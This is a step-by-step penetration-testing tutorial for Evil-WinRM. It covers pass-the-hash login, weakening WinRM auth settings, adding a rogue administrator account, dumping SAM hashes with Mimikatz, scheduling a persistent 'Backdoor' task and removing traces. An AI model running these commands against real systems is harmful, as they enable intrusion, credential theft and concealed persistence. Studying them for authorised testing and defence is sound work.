### Step-by-Step Tutorial on Using Evil-WinRM

Evil-WinRM is a popular tool for penetration testers and red teamers to interact with Windows machines using the Windows Remote Management (WinRM) protocol. It allows for remote code execution, file transfer, and other administrative tasks. Below is a detailed guide on how to use Evil-WinRM effectively.

#### Prerequisites

1. **Kali Linux or any other pentesting distribution**: Evil-WinRM is pre-installed in Kali Linux.
2. **A target Windows machine**: Ensure that the target machine has WinRM enabled and that you have valid credentials (username and password or NTLM hash).

#### Step 1: Installing Evil-WinRM

If you don't have Evil-WinRM installed, you can install it using the following command:
```bash
gem install evil-winrm
```

#### Step 2: Enable WinRM on the Target Machine

WinRM must be enabled on the target Windows machine. You can enable it using PowerShell on the target machine:
```powershell
winrm quickconfig
winrm set winrm/config/client/auth @{Basic="true"}
winrm set winrm/config/service/auth @{Basic="true"}
winrm set winrm/config/service @{AllowUnencrypted="true"}
```

#### Step 3: Connecting to the Target Machine

Use Evil-WinRM to connect to the target machine. You need the IP address of the target machine and valid credentials.

**Example: Connect using Username and Password**
```bash
evil-winrm -i <target-ip> -u <username> -p <password>
```

**Example: Connect using NTLM Hash**
```bash
evil-winrm -i <target-ip> -u <username> -H <ntlm-hash>
```

#### Step 4: Using Evil-WinRM

Once connected, you will have an interactive PowerShell session. Here are some common tasks you can perform:

1. **Execute Commands**
   ```powershell
   whoami
   ipconfig
   ```
2. **Upload Files**
   ```powershell
   upload /path/to/local/file C:\path\to\remote\destination
   ```
3. **Download Files**
   ```powershell
   download C:\path\to\remote\file /path/to/local/destination
   ```
4. **Check System Information**
   ```powershell
   systeminfo
   ```

#### Examples

1. **Check Network Configuration**
   ```powershell
   ipconfig /all
   ```

2. **List Files in a Directory**
   ```powershell
   dir C:\Users\<username>\Documents
   ```

3. **Add a New User**
   ```powershell
   net user eviladmin Password123! /add
   net localgroup administrators eviladmin /add
   ```

4. **Dump Password Hashes (Requires Privileges)**
   Using Mimikatz (you must have it uploaded or accessible):
   ```powershell
   mimikatz.exe "privilege::debug" "lsadump::sam" exit
   ```

#### Step 5: Maintaining Access

To maintain access, you might want to create a persistent backdoor or schedule a task:
```powershell
schtasks /create /sc daily /tn "Backdoor" /tr "C:\path\to\payload.exe" /st 12:00
```

#### Step 6: Cleaning Up

After completing your tasks, it’s good practice to clean up any traces of your activities:
```powershell
net user eviladmin /delete
del C:\path\to\uploaded\files
```

### Conclusion

Evil-WinRM is a powerful tool for remote administration and penetration testing of Windows machines. By following this guide, you should be able to effectively use Evil-WinRM for various tasks in your cybersecurity endeavors. Always remember to use these tools responsibly and within the bounds of the law and ethical guidelines.